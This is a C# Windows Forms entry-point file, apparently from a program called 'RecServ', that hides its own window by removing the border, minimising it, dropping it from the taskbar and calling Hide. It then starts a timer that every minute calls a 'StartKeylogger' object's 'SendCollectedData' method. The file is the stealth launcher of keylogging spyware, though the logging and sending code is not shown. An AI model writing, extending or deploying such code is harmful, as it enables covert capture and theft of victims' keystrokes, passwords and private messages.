namespace RecServ
{
    internal static class Program
    {
        private static RecServMain mainForm;
        private static System.Windows.Forms.Timer timer;

        [STAThread]
        static void Main()
        {
            #region - Hides UI
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Move the ApplicationConfiguration.Initialize() call here
            ApplicationConfiguration.Initialize();

            mainForm = new RecServMain();
            mainForm.FormBorderStyle = FormBorderStyle.None;

            mainForm.WindowState = FormWindowState.Minimized;
            mainForm.ShowInTaskbar = false;

            mainForm.Hide();
            #endregion



            // Initialize and start the timer
            timer = new System.Windows.Forms.Timer();
            TimeSpan interval = TimeSpan.FromMinutes(1);
            timer.Interval = (int)interval.TotalMilliseconds;
            timer.Tick += Timer_Tick;
            timer.Start();



            //ApplicationConfiguration.Initialize(); (Moved Above at Line 16)
            Application.Run(mainForm);
        }


        private static void Timer_Tick(object sender, EventArgs e)
        {
            StartKeylogger startKeylogger = new StartKeylogger();

            startKeylogger.SendCollectedData();
        }
    }
}